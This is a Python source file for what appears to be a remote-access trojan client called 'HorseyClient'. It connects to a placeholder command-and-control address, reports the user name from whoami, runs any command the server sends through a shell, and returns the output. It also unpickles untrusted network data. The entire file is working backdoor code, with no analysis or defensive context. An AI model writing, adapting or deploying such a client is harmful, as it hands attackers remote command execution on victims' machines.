import atexit
from dataclasses import dataclass
import pickle
import socket
import subprocess
import threading


@dataclass
class Data:
    author: str
    type: str
    content: str


class HorseyClient:
    def __init__(self, address: str, port: int, data_header_length: int = 16, string_encoding: str = "utf-8"):
        self.address = address
        self.port = port
        self.socket_address = (address, port)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.data_header_length = data_header_length
        self.string_encoding = string_encoding

    def send_data(self, data: Data) -> None:
        serialised_data = pickle.dumps(data)

        self.socket.send(str(len(serialised_data)).rjust(self.data_header_length).encode(self.string_encoding))
        self.socket.send(serialised_data)

    def receive_data(self) -> Data:
        remaining_header_bytes = self.data_header_length
        encoded_header = b""
        while remaining_header_bytes:
            header_fragment = self.socket.recv(remaining_header_bytes)
            remaining_header_bytes -= len(header_fragment)
            encoded_header += header_fragment

        remaining_data_bytes = int(encoded_header.decode(self.string_encoding))
        serialized_data = b""
        while remaining_data_bytes:
            serialized_data_fragment = self.socket.recv(remaining_data_bytes)
            remaining_data_bytes -= len(serialized_data_fragment)
            serialized_data += serialized_data_fragment

        return pickle.loads(serialized_data)

    def data_handler(self, data: Data) -> None:
        print(f"Data({data.author=}, {data.type=}, {data.content=})")

    def command_handler(self, command: str) -> None:
        try:
            command_output = subprocess.check_output(command.split(), shell=True,
                                                     encoding=self.string_encoding, errors="ignore")
            self.send_data(Data(self.address, "COMMAND_OUTPUT", command_output))

        except subprocess.CalledProcessError:
            self.send_data(Data(self.address, "COMMAND_ERROR", ''))

    def start(self) -> None:
        self.socket.connect(self.socket_address)
        alias = subprocess.check_output(("whoami",), encoding=self.string_encoding).strip().replace('\\', '_').replace(
            '/', '_')
        self.send_data(Data(self.address, "ALIAS", alias))

        while True:
            try:
                data = self.receive_data()
            except OSError:
                break

            match data.type:
                case "DISCONNECT":
                    self.send_data(Data(self.address, "DISCONNECT", ""))
                    break

                case "COMMAND":
                    td_command_handler = threading.Thread(target=self.command_handler, args=(data.content,),
                                                          daemon=True)
                    td_command_handler.start()

                case _:
                    self.data_handler(data)


def disconnect_at_exit(client: HorseyClient):
    client.send_data(Data(client.address, "DISCONNECT", ""))


if __name__ == "__main__":
    client = HorseyClient("<c2_address>", 5050)

    atexit.register(disconnect_at_exit, client)

    client.start()
